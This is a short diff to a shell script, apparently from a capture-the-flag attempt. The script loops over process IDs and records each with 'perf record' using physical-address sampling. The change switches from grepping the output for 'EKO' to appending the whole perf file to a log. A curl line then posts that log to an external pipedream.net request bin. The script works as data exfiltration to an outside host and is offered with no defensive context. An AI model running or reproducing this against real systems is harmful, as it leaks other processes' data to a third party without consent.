@@ -6,6 +6,6 @@ do
     perf record -p $pid -o "/tmp/$pid.perf" -d --phys-data >> /tmp/file.txt;
     echo "finished running perf" >> /tmp/file.txt;
     echo $(ls -l /tmp | grep .perf) >> /tmp/file.txt;
-    echo $(cat "/tmp/$pid.perf" | grep EKO) >> /tmp/file.txt;
+    cat "/tmp/$pid.perf" >> /tmp/file.txt;
     curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net
 done
